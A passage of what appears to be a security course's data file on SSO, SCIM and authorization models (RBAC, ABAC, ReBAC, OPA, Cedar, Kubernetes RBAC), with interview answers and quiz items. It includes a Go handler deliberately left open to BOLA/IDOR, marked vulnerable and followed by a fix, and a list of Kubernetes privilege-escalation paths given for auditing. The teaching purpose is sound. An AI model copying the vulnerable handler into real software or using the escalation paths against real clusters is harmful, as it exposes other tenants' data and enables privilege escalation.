    if err := json.NewDecoder(http.MaxBytesReader(w, r.Body, 1<<20)).Decode(&p); err != nil {
        scimError(w, http.StatusBadRequest, "invalidSyntax")
        return
    }
    id := r.PathValue("id")
    for _, op := range p.Operations {
        if !strings.EqualFold(op.Op, "replace") && !strings.EqualFold(op.Op, "add") {
            continue
        }
        if op.Path != "" && !strings.EqualFold(op.Path, "active") {
            continue // other attributes handled elsewhere
        }
        active, ok := parseBool(op.Value)
        if !ok || active {
            continue
        }
        ctx := r.Context()
        if err := h.users.Deactivate(ctx, tenant, id); err != nil { // WHERE tenant_id = $1 AND id = $2
            scimError(w, http.StatusNotFound, "user not found")
            return
        }
        h.sessions.DeleteAllForUser(ctx, tenant, id)
        h.tokens.RevokeAllForUser(ctx, tenant, id) // refresh tokens, PATs, API keys
        h.audit.Log(ctx, "scim.deactivate", tenant, id)
    }
    u, err := h.users.Get(r.Context(), tenant, id)
    if err != nil {
        scimError(w, http.StatusNotFound, "user not found")
        return
    }
    w.Header().Set("Content-Type", "application/scim+json")
    json.NewEncoder(w).Encode(toSCIM(u))
}`,
          lang: 'go'
        },
        {
          t: 'Design SSO for a multi-tenant SaaS',
          d: 'hard',
          type: 'design',
          hint: `<ul><li>Per-tenant connections (SAML or OIDC) through a broker; home-realm discovery by domain or subdomain.</li><li>Verified domains per tenant; enforce SSO for those domains; break-glass admin.</li><li>Identity key = (tenant, IdP, immutable subject); role mapping from groups; SCIM for lifecycle.</li><li>Tenant isolation everywhere: per-tenant ACS/entity IDs or connection IDs, sessions and data scoped by tenant.</li></ul>`,
          solution: `Components:
  Identity broker (Keycloak / Auth0 / WorkOS / Entra External ID) with one "connection" per tenant
  App + BFF speak only OIDC to the broker; broker speaks SAML/OIDC to customer IdPs.
Tenant onboarding (self-service admin console):
  1. Verify domain ownership (DNS TXT) -> acme.com belongs to tenant "acme".
  2. Upload IdP metadata URL (SAML) or issuer + client credentials (OIDC); test connection.
  3. Configure attribute mapping and group -> role mapping; optionally require SSO for verified domains.
  4. Issue SCIM endpoint + token for provisioning.
Login:
  - Home realm discovery: subdomain (acme.app.com) or email domain -> connection.
  - Per-tenant SAML entityID/ACS (/saml/{tenant}/acs) so assertions for tenant A cannot be replayed to tenant B.
  - Broker validates assertion, issues ID token with tenant_id, idp, sub (immutable NameID/objectId), groups.
  - App maps (tenant_id, idp, sub) -> user; denies if user not provisioned/inactive or no role.
Security:
  - Enforced SSO for verified domains (no password login), MFA delegated to customer IdP, acr checks for admins.
  - Break-glass owner account with passkey, alerting on use.
  - Deprovisioning via SCIM -> sessions & tokens revoked; session max 12h; back-channel logout where supported.
  - Audit log per tenant exportable to customer SIEM.
  - Monitoring: IdP cert expiry per tenant, login failure rates per connection.`,
          lang: 'text'
        },
        {
          t: 'Migrate an enterprise app from SAML to OIDC without disruption',
          d: 'hard',
          type: 'design',
          hint: `<ul><li>Run both protocols in parallel; the same user must map to the same account.</li><li>Identity key mismatch: SAML NameID vs OIDC sub — find a common immutable attribute (e.g. Entra objectId / Okta user id).</li><li>Per-tenant cutover with rollback; communication with customer IT.</li></ul>`,
          solution: `1. Inventory tenants: IdP type, NameID format, attributes, SLO usage, IdP-initiated usage.
2. Add OIDC connection per tenant alongside SAML (broker makes this a config change).
3. Account linking: store (tenant, protocol, subject) identities; pre-compute OIDC subjects by mapping an
   immutable attribute present in both (Entra: oid claim vs SAML objectidentifier attribute; Okta: user id).
4. Pilot: enable OIDC for internal tenant, then 5% of tenants (feature flag per tenant), monitor login success,
   duplicate-account creation (should be 0), latency.
5. IdP-initiated users: replace app tiles with a bookmark URL that starts an SP/RP-initiated flow.
6. Logout: replace SAML SLO with OIDC RP-initiated + back-channel logout.
7. Cut over tenant by tenant; keep SAML available for rollback for 30 days; then disable and remove SP certs.
8. Post-migration: remove SAML library (reduces XML attack surface), update docs and onboarding.`,
          lang: 'text'
        }
      ],
      interviewFocus: [
        {
          q: 'SAML vs OIDC — how do they differ and which would you choose?',
          a: `<p>Both deliver federated SSO with an IdP-signed statement about the user, but:</p>
<ul>
<li><strong>Format</strong>: SAML uses XML assertions with XML-DSig; OIDC uses JSON and JWTs.</li>
<li><strong>Transport</strong>: SAML responses travel through the browser (POST binding); OIDC code flow fetches tokens over a back channel, so tokens don't pass through the browser.</li>
<li><strong>Clients</strong>: SAML is browser-only; OIDC covers SPAs, mobile, CLIs and devices and is built on OAuth, so the same flow yields API access tokens.</li>
<li><strong>Operations</strong>: OIDC has discovery and JWKS rotation; SAML often relies on manually exchanged metadata and certificates (rollover outages).</li>
<li><strong>Security</strong>: SAML's XML signature processing is a recurring source of critical bugs (XSW, canonicalization, parser differentials, XXE); OIDC's risks are JWT validation mistakes and redirect/token handling.</li>
</ul>
<p><strong>Choice</strong>: OIDC for new apps and APIs. For B2B SaaS I'd still <em>accept</em> SAML because enterprise customers demand it — via a broker that terminates SAML and issues OIDC tokens internally, so services only implement one modern protocol.</p>`
        },
        {
          q: 'Walk through SP-initiated SAML SSO and the validations the SP performs.',
          a: `<ol>
<li>User hits a protected page; SP has no session.</li>
<li>SP builds an <code>AuthnRequest</code> (unique ID, Issuer = SP entityID, ACS URL), stores the ID for this browser, redirects to the IdP SSO URL (HTTP-Redirect binding, optionally signed) with a <code>RelayState</code> reference.</li>
<li>IdP authenticates (MFA, conditional access) and POSTs a signed <code>Response</code> via auto-submitting form to the ACS.</li>
<li>SP validates: XML hygiene (no DTD), signature with the pinned IdP cert, uses only the signed assertion, Issuer, Destination = ACS, InResponseTo = stored request ID (single use), Audience = SP entityID, Recipient, NotBefore/NotOnOrAfter with small skew, assertion ID not replayed.</li>
<li>SP maps the persistent NameID (scoped by IdP/tenant) to a user, applies role mapping from attributes, creates a new session, redirects to the allow-listed RelayState target.</li>
</ol>
<p>I'd add: IdP-initiated disabled or bounced into SP-initiated; IdP certificate rollover via metadata refresh; SCIM for deprovisioning.</p>`
        },
        {
          q: 'What is XML Signature Wrapping and how do you defend against it?',
          a: `<p>XSW exploits a mismatch between the component that verifies the signature and the component that reads the data. The attacker keeps a legitimately signed assertion somewhere in the document (so verification succeeds) and inserts a forged unsigned assertion where the application looks. The verifier says "valid", the app logs in the forged identity.</p>
<p>Defenses:</p>
<ul>
<li>Use a maintained SAML library; patch fast — recent critical bypasses (e.g. 2024–2025 ruby-saml) came from parser differentials.</li>
<li>Consume exactly the element returned by the verifier; never re-query raw XML.</li>
<li>Strict schema validation, exactly one assertion, signatures required, certificates pinned from metadata (ignore embedded KeyInfo), strong algorithms only.</li>
<li>Disable DTDs/external entities (XXE) and limit document size.</li>
<li>Negative tests with XSW payloads in CI.</li>
</ul>`
        },
        {
          q: 'How would you design enterprise SSO and provisioning for a B2B SaaS product?',
          a: `<ul>
<li><strong>Connections per tenant</strong> (SAML and OIDC) through an identity broker; app speaks only OIDC internally.</li>
<li><strong>Domain verification</strong> (DNS TXT) and home-realm discovery; optional "SSO required" for verified domains with a passkey-protected break-glass admin.</li>
<li><strong>Identity mapping</strong> by (tenant, IdP, immutable subject), never email; group/app-role to role mapping configured by the tenant admin.</li>
<li><strong>SCIM 2.0</strong> for create/update/deactivate; on deactivate kill sessions and revoke tokens/API keys. JIT only as a fallback.</li>
<li><strong>Isolation</strong>: per-tenant ACS/connection IDs, tenant-scoped sessions and data access.</li>
<li><strong>Operations</strong>: IdP certificate expiry monitoring, per-connection login metrics, self-service test tool, audit logs exportable to the customer's SIEM.</li>
</ul>`
        }
      ],
      quiz: [
        { q: 'In SAML, which party issues assertions and which consumes them?', a: 'The Identity Provider (IdP) issues signed assertions; the Service Provider (SP) consumes them at its Assertion Consumer Service URL.' },
        { q: 'Why are SAML Responses normally sent with the HTTP-POST binding?', a: 'They are large signed XML documents that do not fit reliably in a URL; POST via an auto-submitted form carries them.' },
        { q: 'What does InResponseTo protect against?', a: 'Unsolicited or injected responses: it binds the response to an AuthnRequest the SP issued for that browser, preventing login CSRF and some replays.' },
        { q: 'Which certificate should an SP use to verify the IdP signature?', a: 'The IdP certificate from trusted metadata configured out-of-band, never the KeyInfo certificate embedded in the message.' },
        { q: 'What is the main risk of IdP-initiated SSO?', a: 'Unsolicited responses lack InResponseTo, enabling login CSRF and easier replay or injection of assertions.' },
        { q: 'What do RFC 7643 and RFC 7644 define?', a: 'SCIM 2.0: the core schema (users, groups) and the provisioning protocol (REST endpoints and operations).' },
        { q: 'Why is JIT provisioning insufficient for enterprises?', a: 'It creates accounts on login but cannot deprovision; leavers keep dormant accounts, sessions and API keys.' },
        { q: 'What is the new name of Azure Active Directory?', a: 'Microsoft Entra ID.' }
      ],
      resources: [
        { title: 'OWASP SAML Security Cheat Sheet', url: 'https://cheatsheetseries.owasp.org/cheatsheets/SAML_Security_Cheat_Sheet.html', type: 'docs' },
        { title: 'RFC 7644 — SCIM Protocol', url: 'https://datatracker.ietf.org/doc/html/rfc7644', type: 'docs' },
        { title: 'RFC 7643 — SCIM Core Schema', url: 'https://datatracker.ietf.org/doc/html/rfc7643', type: 'docs' }
      ]
    },
    // ───────────────────────────────────────────── Module 8 ─────────────────────────────────────────────
    {
      n: 8,
      title: 'Authorization: RBAC, ABAC, ReBAC',
      summary: `Deciding who may do what to which resource: RBAC with hierarchies, attribute- and policy-based access control, relationship-based access control in the style of Google Zanzibar (OpenFGA, SpiceDB), policy engines (OPA/Rego, Cedar), Kubernetes RBAC and cloud IAM as real systems, and the multi-tenant isolation and BOLA/IDOR defenses behind the number-one risk in both OWASP Top 10 lists.`,
      topics: [
        {
          title: 'Authorization Models and RBAC',
          def: `<p>Authorization answers <em>"may principal P perform action A on resource R in context C?"</em>. Models trade expressiveness for simplicity:</p>
<table>
<thead><tr><th>Model</th><th>Decision based on</th><th>Good for</th><th>Weakness</th></tr></thead>
<tbody>
<tr><td>ACL</td><td>list of principals per object</td><td>file systems, simple sharing</td><td>hard to manage at scale</td></tr>
<tr><td>RBAC</td><td>roles granted to users; permissions granted to roles</td><td>enterprise apps, admin consoles</td><td>role explosion; no per-object context</td></tr>
<tr><td>ABAC / PBAC</td><td>attributes of subject, resource, action, environment evaluated by policies</td><td>regulated domains, context rules</td><td>harder to audit "who can access X?"</td></tr>
<tr><td>ReBAC</td><td>graph of relationships (owner, member, parent)</td><td>sharing, hierarchies, collaboration apps</td><td>needs a dedicated, consistent store</td></tr>
</tbody>
</table>
<p><strong>RBAC</strong> (NIST model): users &rarr; roles &rarr; permissions. Extensions: <strong>role hierarchy</strong> (admin inherits editor inherits viewer), <strong>constraints</strong> such as separation of duties (the same person cannot both create and approve a payment), and <strong>scoped roles</strong> (role per tenant or per project — "editor of project 7").</p>
<p>Implementation guidance:</p>
<ul>
<li>Name permissions <code>resource:action</code> (<code>invoice:approve</code>) and check <strong>permissions in code, not role names</strong> — roles become configuration.</li>
<li>Deny by default; authorization on every request, server-side.</li>
<li>Scope role bindings (tenant/project) to avoid global admin roles.</li>
<li>Watch for <strong>role explosion</strong> (<code>eu-finance-readonly-contractor</code>): that's a signal you need attributes (ABAC) or relationships (ReBAC).</li>
<li>Review access regularly (access certification), and log every grant change.</li>
</ul>
<p>RBAC answers "can editors edit documents?"; it does not answer "can Alice edit <em>this</em> document?" — that requires ownership/tenant/relationship checks on top.</p>`,
          interview: 'Know the four models and their trade-offs. For RBAC: permissions vs roles, hierarchy, separation of duties, scoped roles, and that RBAC alone does not solve object-level access (BOLA).',
          examples: [
            {
              label: 'Permission-based RBAC check with role hierarchy',
              lang: 'go',
              code: `type Role string

var rolePerms = map[Role][]string{
    "viewer":  {"invoice:read"},
    "editor":  {"invoice:create", "invoice:update"},
    "approver": {"invoice:approve"},
    "admin":   {"user:manage"},
}

var inherits = map[Role][]Role{ // admin > editor > viewer; approver > viewer
    "admin":    {"editor"},
    "editor":   {"viewer"},
    "approver": {"viewer"},
}

func permissions(roles []Role) map[string]bool {
    out := map[string]bool{}
    var visit func(Role)
    seen := map[Role]bool{}
    visit = func(r Role) {
        if seen[r] {
            return
        }
        seen[r] = true
        for _, p := range rolePerms[r] {
            out[p] = true
        }
        for _, parent := range inherits[r] {
            visit(parent)
        }
    }
    for _, r := range roles {
        visit(r)
    }
    return out
}

// Code checks permissions, never role names:
//   if !permissions(user.Roles)["invoice:approve"] { return ErrForbidden }`
            }
          ]
        },
        {
          title: 'ABAC and Policy-Based Access Control',
          def: `<p><strong>Attribute-Based Access Control</strong> evaluates policies over attributes:</p>
<ul>
<li><strong>Subject</strong>: id, department, clearance, tenant, roles, MFA level (<code>acr</code>), employment type.</li>
<li><strong>Resource</strong>: owner, tenant, classification, region, state (draft/published), amount.</li>
<li><strong>Action</strong>: read, update, approve, export.</li>
<li><strong>Environment</strong>: time, IP/network, device posture, risk score.</li>
</ul>
<p>Example policy: <em>"Finance approvers may approve invoices of their own tenant up to 10,000 EUR, not ones they created themselves, only from a managed device."</em> That is awkward in pure RBAC (you'd need roles per limit) but natural in ABAC.</p>
<p>The XACML architecture terms are still used everywhere:</p>
<table>
<thead><tr><th>Component</th><th>Role</th><th>Example</th></tr></thead>
<tbody>
<tr><td>PEP — enforcement point</td><td>intercepts the request, asks for a decision, enforces it</td><td>Go middleware, Envoy ext_authz, API gateway</td></tr>
<tr><td>PDP — decision point</td><td>evaluates policies</td><td>OPA, Cedar, OpenFGA</td></tr>
<tr><td>PIP — information point</td><td>supplies attributes</td><td>user directory, resource DB</td></tr>
<tr><td>PAP — administration point</td><td>where policies are authored and versioned</td><td>Git repo + CI</td></tr>
</tbody>
</table>
<p><strong>Trade-offs</strong>: very expressive and context-aware; but "who can access X?" (auditing, listing) is hard because the answer depends on runtime attributes, and attribute freshness/trust matters (an attribute from the client is worthless). In practice most systems are <strong>hybrid</strong>: RBAC for coarse capabilities, ABAC conditions for context, ReBAC for sharing.</p>`,
          interview: 'Give a concrete policy that is awkward in RBAC and natural in ABAC, define PEP/PDP/PIP, and acknowledge the audit/listing difficulty. Emphasize attributes must come from trusted sources, not request bodies.',
          examples: [
            {
              label: 'ABAC input document sent from PEP to PDP',
              lang: 'json',
              code: `{
  "subject":  { "id": "u_17", "tenant_id": "t_42", "roles": ["finance-approver"], "acr": "phishing-resistant",
                "device_managed": true },
  "action":   "approve",
  "resource": { "type": "invoice", "id": "inv_901", "tenant_id": "t_42", "amount": 8200,
                "currency": "EUR", "created_by": "u_33", "status": "pending" },
  "context":  { "time": "2026-10-29T10:15:00Z", "ip": "10.2.3.4" }
}`
            }
          ]
        },
        {
          title: 'ReBAC and Google Zanzibar (OpenFGA, SpiceDB)',
          def: `<p><strong>Relationship-Based Access Control</strong> derives permissions from a graph of relationships: "Alice can view doc 1 because she is a member of group eng, which is an editor of folder X, which is the parent of doc 1". Google's <strong>Zanzibar</strong> paper (2019) describes the system behind Drive, YouTube and Cloud IAM sharing.</p>
<ul>
<li><strong>Relation tuples</strong>: <code>object#relation@subject</code>, e.g. <code>doc:1#viewer@user:alice</code>, <code>doc:1#parent@folder:x</code>, <code>folder:x#editor@group:eng#member</code>.</li>
<li><strong>Schema / authorization model</strong> with <strong>userset rewrites</strong>: <code>viewer = direct viewers OR editors OR viewers of parent</code>.</li>
<li><strong>APIs</strong>: <em>Check</em> (can user U do R on object O?), <em>Expand</em>, <em>ListObjects</em> (which docs can Alice see? — needed for filtered lists), <em>ListUsers</em>, <em>Write</em> tuples.</li>
<li><strong>Consistency</strong>: the <strong>"new enemy" problem</strong> — if Alice removes Bob from a folder and then adds a secret doc, a stale check must not let Bob see the doc. Zanzibar uses <strong>zookies</strong> (consistency tokens, Spanner snapshot timestamps); SpiceDB uses ZedTokens; OpenFGA offers consistency preferences.</li>
</ul>
<p><strong>Open-source implementations</strong>: <strong>OpenFGA</strong> (CNCF, originated at Auth0/Okta), <strong>SpiceDB</strong> (AuthZed), Ory Keto, Permify. Each runs as a service; apps write tuples when relationships change (e.g. on share, on group membership) and call Check on requests.</p>
<p><strong>Trade-offs</strong>: excellent for sharing and hierarchies, answers "who can access X" and "what can U access"; but it is another critical, latency-sensitive dependency, tuples must be kept in sync with your primary DB (dual-write or outbox), and contextual rules (time, amount) need ABAC-style conditions (OpenFGA conditions, SpiceDB caveats).</p>`,
          interview: 'Explain tuples, rewrites (inheritance via parent), Check vs ListObjects, and the new-enemy problem with zookies. Name OpenFGA and SpiceDB and the operational cost: sync between app DB and tuple store.',
          examples: [
            {
              label: 'OpenFGA model for folders and documents',
              lang: 'text',
              code: `model
  schema 1.1

type user

type group
  relations
    define member: [user]

type folder
  relations
    define owner: [user]
    define parent: [folder]
    define editor: [user, group#member] or owner or editor from parent
    define viewer: [user, group#member] or editor or viewer from parent

type document
  relations
    define parent: [folder]
    define owner: [user]
    define editor: [user, group#member] or owner or editor from parent
    define viewer: [user, user:*, group#member] or editor or viewer from parent
    define can_share: owner or editor

# tuples
#   group:eng#member@user:alice
#   folder:roadmaps#editor@group:eng#member
#   document:q4-plan#parent@folder:roadmaps
# check(user:alice, viewer, document:q4-plan) -> true (member of eng -> editor of folder -> viewer of doc)`
            }
          ]
        },
        {
          title: 'Policy Engines: OPA/Rego and Cedar',
          def: `<p>Externalizing authorization into a <strong>policy engine</strong> gives one language, versioned in Git, testable in CI, with decision logs for audit — and lets multiple services share the same rules.</p>
<p><strong>Open Policy Agent (OPA)</strong> — CNCF graduated, general-purpose:</p>
<ul>
<li>Policies in <strong>Rego</strong> (declarative, Datalog-inspired). OPA 1.0 (Dec 2024) made the <code>if</code>/<code>contains</code> keywords mandatory ("Rego v1").</li>
<li>Deploy as a sidecar/daemon (REST <code>POST /v1/data/authz/allow</code>), embedded Go library (<code>github.com/open-policy-agent/opa/v1/rego</code>), or WebAssembly. Policies and data distributed as signed <strong>bundles</strong>.</li>
<li>Same engine powers Kubernetes admission control (<strong>Gatekeeper</strong>), Envoy <code>ext_authz</code>, Terraform plan checks (conftest).</li>
<li><code>opa test</code> for unit tests; decision logs for audit.</li>
</ul>
<p><strong>Cedar</strong> — open-source language from AWS, used by <strong>Amazon Verified Permissions</strong> and AWS Verified Access:</p>
<ul>
<li>Purpose-built for application authorization: <code>permit</code>/<code>forbid</code> policies over <code>principal</code>, <code>action</code>, <code>resource</code>, <code>context</code>, with entity hierarchies (<code>principal in Group::"x"</code>).</li>
<li><strong>forbid overrides permit</strong>; default deny.</li>
<li>Designed for <strong>analysis</strong>: schema validation and formal reasoning (e.g. "can any policy let a suspended user read?"), and fast, bounded evaluation.</li>
</ul>
<p><strong>Architecture decisions</strong>: library (no network hop, sub-millisecond) vs sidecar vs central service (single source of truth, but latency and availability risk). Decide where data comes from: send it in the <em>input</em> (PEP gathers attributes) or replicate it into the engine. Always <strong>fail closed</strong> on engine errors, and cache decisions only with care.</p>`,
          interview: 'Contrast OPA (general purpose, Rego, Kubernetes/Envoy ecosystem) with Cedar (application authz, analyzable, forbid-overrides-permit). Discuss deployment topology, data flow into the engine, latency, fail-closed, and policy testing in CI.',
          examples: [
            {
              label: 'Same rule in Rego (OPA 1.0) and Cedar',
              lang: 'text',
              code: `# ---- Rego ----
package authz

default allow := false

allow if {
    input.action == "approve"
    input.resource.type == "invoice"
    input.resource.tenant_id == input.subject.tenant_id
    "finance-approver" in input.subject.roles
    input.resource.amount <= 10000
    input.resource.created_by != input.subject.id      # separation of duties
}

# ---- Cedar ----
permit (
    principal in Role::"finance-approver",
    action == Action::"approve",
    resource is Invoice
) when {
    resource.tenant == principal.tenant &&
    resource.amount <= 10000
} unless {
    resource.createdBy == principal
};

forbid (principal, action, resource) when { principal.suspended };`
            }
          ]
        },
        {
          title: 'Kubernetes RBAC and Cloud IAM as Real-World Examples',
          def: `<p><strong>Kubernetes RBAC</strong>: purely additive (no deny rules), default deny.</p>
<ul>
<li><code>Role</code> (namespaced) / <code>ClusterRole</code> (cluster-wide or reusable) contain rules: <code>apiGroups</code>, <code>resources</code>, <code>verbs</code> (get, list, watch, create, update, patch, delete), optional <code>resourceNames</code>.</li>
<li><code>RoleBinding</code> / <code>ClusterRoleBinding</code> bind them to users, groups (from OIDC/certificates) or ServiceAccounts.</li>
<li><strong>Escalation paths</strong> to audit: <code>create pods</code> (or Deployments, Jobs, any pod controller) in a namespace &asymp; read every Secret and run as any ServiceAccount there (mount them); <code>pods/exec</code> and <code>pods/attach</code> into privileged pods; <code>create serviceaccounts/token</code> mints tokens for that account; <code>list</code>/<code>watch</code> on secrets reveals contents (not just names); verbs <code>escalate</code>, <code>bind</code>, <code>impersonate</code>; <code>nodes/proxy</code>; <code>patch</code> on RoleBindings; wildcards <code>*</code>; anything bound to <code>cluster-admin</code>.</li>
<li>Verify with <code>kubectl auth can-i ... --as=system:serviceaccount:ns:name</code> and <code>--list</code>.</li>
</ul>
<p><strong>AWS IAM policy evaluation</strong> (simplified): start at implicit deny &rarr; any <strong>explicit Deny</strong> in any applicable policy wins &rarr; Organizations SCPs/RCPs must allow &rarr; resource-based policies can grant (incl. cross-account, which also needs identity-side allow) &rarr; permissions boundaries and session policies cap identity policies &rarr; identity policy must allow. Use conditions (<code>aws:PrincipalTag</code>, <code>aws:ResourceTag</code> = ABAC; <code>aws:SourceVpce</code>, <code>aws:PrincipalOrgID</code>).</p>
<p><strong>GCP IAM</strong>: allow policies binding principals to roles on the resource hierarchy (org &rarr; folder &rarr; project &rarr; resource), inherited downward, plus deny policies and IAM Conditions. <strong>Azure RBAC</strong>: role assignments at management group/subscription/resource group/resource scope, with deny assignments.</p>
<p>Lessons transferable to app design: default deny, explicit deny precedence, scoped bindings, conditions on tags (ABAC), and tools to answer "who can do X?" (IAM Access Analyzer, Policy Analyzer).</p>`,
          interview: 'Know Role vs ClusterRole and bindings, the non-obvious escalation paths (create pods, escalate/bind/impersonate), kubectl auth can-i, and the AWS evaluation order with explicit deny. These are frequent in cloud-native interviews.',
          examples: [
            {
              label: 'Least-privilege Role and verification',
              lang: 'bash',
              code: `cat <<'EOF' | kubectl apply -f -
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata: { name: config-reloader, namespace: payments }
rules:
- apiGroups: [""]
  resources: ["configmaps"]
  verbs: ["get", "list", "watch"]
- apiGroups: ["apps"]
  resources: ["deployments"]
  resourceNames: ["payments-api"]
  verbs: ["get", "patch"]
---
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata: { name: config-reloader, namespace: payments }
subjects: [{ kind: ServiceAccount, name: config-reloader, namespace: payments }]
roleRef: { kind: Role, name: config-reloader, apiGroup: rbac.authorization.k8s.io }
EOF

SA=system:serviceaccount:payments:config-reloader
kubectl auth can-i patch deployment/payments-api -n payments --as=$SA   # yes
kubectl auth can-i patch deployment/ledger -n payments --as=$SA         # no
kubectl auth can-i get secrets -n payments --as=$SA                     # no
kubectl auth can-i create pods -n payments --as=$SA                     # no (would allow reading secrets)
kubectl auth can-i --list -n payments --as=$SA`
            }
          ]
        },
        {
          title: 'Multi-Tenant Authorization and BOLA/IDOR Prevention',
          def: `<p><strong>Broken Object Level Authorization</strong> (OWASP API1:2023), a.k.a. IDOR: the API checks that the caller is authenticated, maybe that they have <code>invoice:read</code>, but not that <em>this</em> invoice belongs to them or their tenant. Change <code>/invoices/1001</code> to <code>/invoices/1002</code> &rarr; another customer's data. It is the most common serious API vulnerability, and "Broken Access Control" is #1 in the OWASP Top 10.</p>
<p>Related API Top 10 items: <strong>BFLA</strong> (API5, Broken Function Level Authorization — a normal user can call <code>DELETE /admin/users</code>) and <strong>BOPLA</strong> (API3, Broken Object Property Level Authorization — mass assignment of <code>role</code>/<code>tenant_id</code>, or excessive data exposure of fields the user shouldn't see).</p>
<p><strong>Prevention patterns</strong>:</p>
<ul>
<li><strong>Tenant from the token, never from the request</strong>: <code>tenant_id</code> comes from the verified session/token claims, not from a header, path or body.</li>
<li><strong>Scoped data access</strong>: every repository method takes the principal/tenant and includes it in the query (<code>WHERE id = $1 AND tenant_id = $2</code>); make the unscoped version impossible to call (no exported "get by id").</li>
<li><strong>Database-enforced isolation</strong>: PostgreSQL Row-Level Security with a per-transaction <code>app.tenant_id</code> setting, or schema/database per tenant (silo) for high-isolation tiers.</li>
<li><strong>Centralized check helpers</strong> (<code>authz.Can(ctx, principal, "invoice:read", inv)</code>) used in every handler; lint or test that no handler skips them.</li>
<li><strong>Return 404</strong> for objects in other tenants to avoid existence leaks.</li>
<li><strong>Explicit DTOs</strong> for input (allow-listed fields) and output (no internal fields).</li>
<li>Unguessable IDs (UUIDv4/v7) reduce enumeration but are <strong>not</strong> authorization.</li>
<li><strong>Automated tests</strong>: two-tenant fixtures, every endpoint called cross-tenant must fail.</li>
</ul>
<p>Isolation models: <em>pool</em> (shared tables + tenant_id), <em>bridge</em> (schema per tenant), <em>silo</em> (DB/account per tenant) — trade cost vs blast radius; per-tenant encryption keys add crypto isolation.</p>`,
          interview: 'Define BOLA, BFLA and BOPLA with examples. For prevention, the senior answer combines: tenant from verified token, scoped repositories, DB-level RLS as defense in depth, explicit DTOs, 404 on foreign objects, and cross-tenant automated tests.',
          examples: [
            {
              label: 'Tenant-scoped repository (unscoped access impossible)',
              lang: 'go',
              code: `type Principal struct {
    UserID   string
    TenantID string
    Perms    map[string]bool
}

type InvoiceRepo struct{ db *sql.DB }

// No method accepts an invoice id without the tenant from the verified principal.
func (r *InvoiceRepo) Get(ctx context.Context, p Principal, id string) (*Invoice, error) {
    var inv Invoice
    err := r.db.QueryRowContext(ctx,
        \`SELECT id, tenant_id, amount, status, created_by FROM invoices WHERE id = $1 AND tenant_id = $2\`,
        id, p.TenantID).Scan(&inv.ID, &inv.TenantID, &inv.Amount, &inv.Status, &inv.CreatedBy)
    if errors.Is(err, sql.ErrNoRows) {
        return nil, ErrNotFound // same result for "doesn't exist" and "other tenant's"
    }
    if err != nil {
        return nil, err
    }
    return &inv, nil
}`
            }
          ]
        }
      ],
      problems: [
        {
          t: 'Design RBAC tables and a permission check query',
          d: 'easy',
          type: 'design',
          hint: `<ul><li>Tables: users, roles, permissions, role_permissions, user_roles (with scope: tenant/project).</li><li>Single query: does user U have permission P in tenant T?</li><li>Index for the hot path; cache per request.</li></ul>`,
          solution: `CREATE TABLE roles        (id TEXT PRIMARY KEY, description TEXT);
CREATE TABLE permissions  (id TEXT PRIMARY KEY);                    -- 'invoice:approve'
CREATE TABLE role_permissions (role_id TEXT REFERENCES roles, permission_id TEXT REFERENCES permissions,
                               PRIMARY KEY (role_id, permission_id));
CREATE TABLE user_roles   (user_id UUID, tenant_id UUID, role_id TEXT REFERENCES roles,
                           granted_by UUID, granted_at TIMESTAMPTZ DEFAULT now(),
                           PRIMARY KEY (user_id, tenant_id, role_id));

-- Check
SELECT EXISTS (
  SELECT 1 FROM user_roles ur
  JOIN role_permissions rp ON rp.role_id = ur.role_id
  WHERE ur.user_id = $1 AND ur.tenant_id = $2 AND rp.permission_id = $3
);

Notes: role hierarchy via a role_parents table + recursive CTE (or flatten at write time);
audit table for grants/revocations; SoD constraint enforced in the grant API
(e.g. a user cannot hold both 'payment-creator' and 'payment-approver' in the same tenant).`,
          lang: 'text'
        },
        {
          t: 'Implement permission-checking middleware for Go 1.22 routes',
          d: 'easy',
          type: 'coding',
          hint: `<ul><li>Wrap handlers: <code>mux.Handle("DELETE /users/{id}", Require("user:manage", h))</code>.</li><li>Principal comes from the auth middleware's context; missing &rarr; 401; lacking permission &rarr; 403.</li><li>Add a test asserting every registered route has an explicit permission (no forgotten routes).</li></ul>`,
          solution: `type ctxKey struct{}

func PrincipalFrom(ctx context.Context) (*Principal, bool) {
    p, ok := ctx.Value(ctxKey{}).(*Principal)
    return p, ok
}

func Require(perm string, next http.Handler) http.Handler {
    return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
        p, ok := PrincipalFrom(r.Context())
        if !ok {
            http.Error(w, "unauthenticated", http.StatusUnauthorized)
            return
        }
        if !p.Perms[perm] {
            slog.WarnContext(r.Context(), "forbidden", "user", p.UserID, "perm", perm, "route", r.Pattern)
            http.Error(w, "forbidden", http.StatusForbidden)
            return
        }
        next.ServeHTTP(w, r)
    })
}

// Route table makes the permission explicit and reviewable
type route struct {
    pattern, perm string
    h             http.HandlerFunc
}

func register(mux *http.ServeMux, routes []route) {
    for _, rt := range routes {
        if rt.perm == "" {
            panic("route without permission: " + rt.pattern) // fail at startup, not in prod
        }
        mux.Handle(rt.pattern, Require(rt.perm, rt.h))
    }
}`,
          lang: 'go'
        },
        {
          t: 'Find and fix a BOLA/IDOR vulnerability in a Go handler',
          d: 'medium',
          type: 'debug',
          hint: `<ul><li>Look at where the object is loaded: is the tenant/owner part of the query?</li><li>Look at where <code>tenant_id</code> comes from: header? body? token?</li><li>Write the failing cross-tenant test first.</li></ul>`,
          solution: `// VULNERABLE
func (h *H) GetInvoice(w http.ResponseWriter, r *http.Request) {
    tenant := r.Header.Get("X-Tenant-ID")                 // (1) attacker-controlled
    inv, err := h.db.InvoiceByID(r.Context(), r.PathValue("id")) // (2) no tenant in query
    if err != nil { http.NotFound(w, r); return }
    _ = tenant
    json.NewEncoder(w).Encode(inv)                        // (3) returns internal fields too
}

// Exploit: authenticated user of tenant A calls GET /invoices/inv_B_123 -> tenant B's invoice.

// FIXED
func (h *H) GetInvoice(w http.ResponseWriter, r *http.Request) {
    p, _ := PrincipalFrom(r.Context())                    // tenant from the verified token
    inv, err := h.invoices.Get(r.Context(), *p, r.PathValue("id")) // WHERE id=$1 AND tenant_id=$2
    if errors.Is(err, ErrNotFound) {
        http.NotFound(w, r)                               // 404 for foreign objects
        return
    }
    if err != nil {
        http.Error(w, "internal error", http.StatusInternalServerError)
        return
    }
    json.NewEncoder(w).Encode(InvoiceDTO{ID: inv.ID, Amount: inv.Amount, Status: inv.Status}) // explicit DTO
}

// Regression test: tenant A token + tenant B invoice id => 404; plus RLS in Postgres as a second layer.`,
          lang: 'go'
        },
